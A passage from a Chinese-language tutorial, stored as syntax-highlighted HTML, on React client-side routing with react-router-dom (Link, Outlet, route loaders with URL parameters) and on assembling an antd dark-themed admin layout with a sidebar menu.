class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        右侧主操作区\n        <span class=\"token operator\">&lt;</span>Outlet <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 添加子组件的渲染出口 */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> RootPage<span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>完成这些修改后，再次回到浏览器，点击左侧链接，对应的组件内容将显示在右侧的区域。细心的读者可能会留意到，当点击功能一或在功能二链接后，浏览器工具栏的刷新按钮会瞬间出现”旋转“的动画，说明点击<code>&lt;a&gt;</code> 的时候，浏览器发起了一次服务器GET请求，属于服务器端路由。</p>\n<h3>修改为客户端路由</h3>\n<p>使用React路由模块提供的<code>&lt;Link&gt;</code> 组件，将页面路由修改为客户端路由：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Link <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Outlet <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">RootPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>float<span class=\"token operator\">:</span> <span class=\"token string\">'left'</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">:</span> <span class=\"token string\">'200px'</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">:</span> <span class=\"token string\">'600px'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n      左侧功能区\n    <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Link to<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'/one'</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Link<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 将&lt;a&gt;标签修改为&lt;Link&gt;组件，把属性href修改为to */</span><span class=\"token punctuation\">}</span>\n    <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Link to<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'/two'</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Link<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>height<span class=\"token operator\">:</span> <span class=\"token string\">'600px'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n    右侧主操作区\n  <span class=\"token operator\">&lt;</span>Outlet <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> RootPage<span class=\"token punctuation\">;</span>\n</code></pre></div><p>再次回到浏览器验证点击链接后，是否还会向服务器发起网络请求。</p>\n<h3>通过路由url向组件传递参数</h3>\n<ol>\n<li>在路由目标页面定义数据加载器</li>\n</ol>\n<p>修改src\\pages\\PageTwo.tsx组件，定义数据加载器：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> useLoaderData <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//新增数据加载函数，函数根据url传递过来的参数，加载返回数据</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">loader</span><span class=\"token punctuation\">(</span>urlBizData<span class=\"token operator\">:</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>urlBizData<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>bizDataName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>name<span class=\"token operator\">:</span> <span class=\"token string\">'查收数据库的数据'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//返回的示例数据，实际项目请根据场景进行修改</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">PageTow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//获取的就是加载完成的数据</span>\n  <span class=\"token keyword\">const</span> bizDataInfo <span class=\"token operator\">=</span> <span class=\"token function\">useLoaderData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>bizDataInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//打印的就是loader返回的数据</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>textAlign<span class=\"token operator\">:</span> <span class=\"token string\">'center'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">:</span> <span class=\"token string\">'red'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>页面组件二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> PageTow<span class=\"token punctuation\">;</span>\n</code></pre></div><ol start=\"2\">\n<li>修改路由定义文件</li>\n</ol>\n<p>修改路由定义文件，定义url模式和使用数据加载器，修改src\\routers\\RoutesDef.tsx文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> createBrowserRouter <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> RootPage <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/RootPage'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> PageOne <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/PageOne'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> PageTwo<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>loader <span class=\"token keyword\">as</span> pageLoader<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/PageTwo'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//导入数据加载器</span>\n\n<span class=\"token keyword\">const</span> routes <span class=\"token operator\">=</span> <span class=\"token function\">createBrowserRouter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">{</span>\n    path<span class=\"token operator\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>RootPage <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span>\n    children<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{</span>\n      path<span class=\"token operator\">:</span> <span class=\"token string\">'/one'</span><span class=\"token punctuation\">,</span>\n      element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>PageOne <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">,</span>  <span class=\"token punctuation\">{</span>\n      path<span class=\"token operator\">:</span> <span class=\"token string\">'/two/:bizDataName'</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//冒号 ( : ) 具有特殊含义，将其转换为“动态段”，由&lt;Link&gt;组件定义变量bizDataName的值</span>\n      element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>PageTwo <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span>\n      loader<span class=\"token operator\">:</span> pageLoader<span class=\"token punctuation\">,</span><span class=\"token comment\">//定义数据加载器</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> routes<span class=\"token punctuation\">;</span>\n</code></pre></div><p>3、修改<code>&lt;Link&gt;</code> 组件的业务数据\n修改src\\pages\\RootPage.tsx文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Link <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Outlet <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">RootPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>float<span class=\"token operator\">:</span> <span class=\"token string\">'left'</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">:</span> <span class=\"token string\">'200px'</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">:</span> <span class=\"token string\">'600px'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n      左侧功能区\n    <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Link to<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'/one'</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Link<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 修改to属性的值，123就是点击链接是传递的业务数据的值 */</span><span class=\"token punctuation\">}</span>\n    <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>Link to<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'/two/123'</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Link<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>height<span class=\"token operator\">:</span> <span class=\"token string\">'600px'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n右侧主操作区\n  <span class=\"token operator\">&lt;</span>Outlet <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> RootPage<span class=\"token punctuation\">;</span>\n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<p>以上就是Ract的路由相关内容。在实际的开发中，页面样式不应该如此简陋，后续我们将结合antd讲解如何开发一套相对完整的前端应用框架组件。</p>\n<h2>应用基本框架组件</h2>\n<p>对于一些事务性的后台管理系统，我们经常需要类似一个多页签页面的UI界面，如下图所示：</p>\n<figure><figcaption>image.png</figcaption></figure>\n<p>分析上图，根据主键分布，可以把页面组件划分为Layout、menu和tabs三个组件。antd已经提供了对应的组件，只是需要我们一步步组装成我们想要的系统主界面。\n为了让and的框架组件高度占据怎么屏幕，需要在index.tsx文件中引入antd的reset组件：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token string\">'antd/dist/reset.css'</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>该CSS会对HTML元素样式进行重置，比如设置margin、padding为0、html、body元素高度为100等等。</p>\n<h3>构建Layout组件</h3>\n<p>创建src\\layout\\AppLayout.tsx文件</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Layout<span class=\"token punctuation\">,</span> ConfigProvider<span class=\"token punctuation\">,</span> theme <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> Header<span class=\"token punctuation\">,</span> Sider<span class=\"token punctuation\">,</span> Content <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> Layout<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">AppLayout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>ConfigProvider theme<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> algorithm<span class=\"token operator\">:</span> theme<span class=\"token punctuation\">.</span>darkAlgorithm <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 使用antd的暗黑模式 */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token operator\">&lt;</span>Layout<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>Header<span class=\"token operator\">&gt;</span>Header部分<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Header<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>Layout<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>Sider width<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">190</span><span class=\"token punctuation\">}</span> style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>overflow<span class=\"token operator\">:</span> <span class=\"token string\">\"auto\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>span style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>color<span class=\"token operator\">:</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>菜单区<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Sider<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span>Content<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span>span style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>color<span class=\"token operator\">:</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>页签区<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Content<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Layout<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Layout<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ConfigProvider<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> AppLayout<span class=\"token punctuation\">;</span>\n</code></pre></div><p>修改应用入口文件index.tsx文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> ReactDOM <span class=\"token keyword\">from</span> <span class=\"token string\">'react-dom/client'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">'antd/dist/reset.css'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> AppLayout <span class=\"token keyword\">from</span> <span class=\"token string\">'./layout/AppLayout'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> root <span class=\"token operator\">=</span> ReactDOM<span class=\"token punctuation\">.</span><span class=\"token function\">createRoot</span><span class=\"token punctuation\">(</span>\n  document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HTMLElement\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nroot<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span>\n  <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>AppLayout <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>回到浏览器查看结果，发现Layout控件并没有像期望的那样占满整个屏幕，如下图所示：</p>\n<figure><figcaption>image.png</figcaption></figure>\n<p>创建src\\layout\\AppLayout.css文件，并添加CSS代码如下：</p>\n<div class=\"language-css\" data-ext=\"css\" data-title=\"css\"><pre class=\"language-css\"><code><span class=\"token selector\">#root, main, .ant-layout</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这里之所有多个选择器的样式高度需要设置为100%是因为子元素高度是百分比，而这个百分比是相对于父元素的，所以需要把Layout组件的父元素的高度也要设置为100%。\n修改src\\layout\\AppLayout.tsx文件，导入刚刚定义的AppLayout.css文件：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Layout<span class=\"token punctuation\">,</span> ConfigProvider<span class=\"token punctuation\">,</span> theme <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"antd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">'./AppLayout.css'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//添加import css代码</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> Header<span class=\"token punctuation\">,</span> Sider<span class=\"token punctuation\">,</span> Content <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> Layout<span class=\"token punctuation\">;</span>\n</code></pre></div><p>再次回到浏览器页面可以看到Layout组件占满了剩余的屏幕空间。</p>\n<h3>构建菜单组件</h3>\n<p>创建src\\layout\\AppMenu.tsx文件，文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//import { AppstoreOutlined, MailOutlined, SettingOutlined } from '@ant-design/icons';</span>\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span> MenuProps <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//引入菜单项的数据类型</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Menu <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">MenuItem</span> <span class=\"token operator\">=</span> Required<span class=\"token operator\">&lt;</span>MenuProps<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">[</span><span class=\"token string\">'items'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">number</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span>label<span class=\"token operator\">:</span> React<span class=\"token punctuation\">.</span>ReactNode<span class=\"token punctuation\">,</span> key<span class=\"token operator\">:</span> React<span class=\"token punctuation\">.</span>Key<span class=\"token punctuation\">,</span> icon<span class=\"token operator\">?</span><span class=\"token operator\">:</span> React<span class=\"token punctuation\">.</span>ReactNode<span class=\"token punctuation\">,</span> children<span class=\"token operator\">?</span><span class=\"token operator\">:</span> MenuItem<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">?</span><span class=\"token operator\">:</span> <span class=\"token string\">'group'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MenuItem <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>key<span class=\"token punctuation\">,</span> icon<span class=\"token punctuation\">,</span> children<span class=\"token punctuation\">,</span> label<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">}</span> <span class=\"token keyword\">as</span> MenuItem<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">const</span> items<span class=\"token operator\">:</span> MenuProps<span class=\"token punctuation\">[</span><span class=\"token string\">'items'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">'系统菜单'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'systemMenu'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">'功能一'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'systemMenu_menu1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">'功能二'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'systemMenu_menu2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">'功能三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'systemMenu_menu3'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">AppMenu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> onClick<span class=\"token operator\">:</span> MenuProps<span class=\"token punctuation\">[</span><span class=\"token string\">'onClick'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'click '</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>Menu onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>onClick<span class=\"token punctuation\">}</span> defaultSelectedKeys<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">[</span><span class=\"token string\">'systemMenu_menu1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span> defaultOpenKeys<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">[</span><span class=\"token string\">'systemMenu'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span> mode<span class=\"token operator\">=</span><span class=\"token string\">\"inline\"</span> items<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>items<span class=\"token punctuation\">}</span> theme<span class=\"token operator\">=</span><span class=\"token 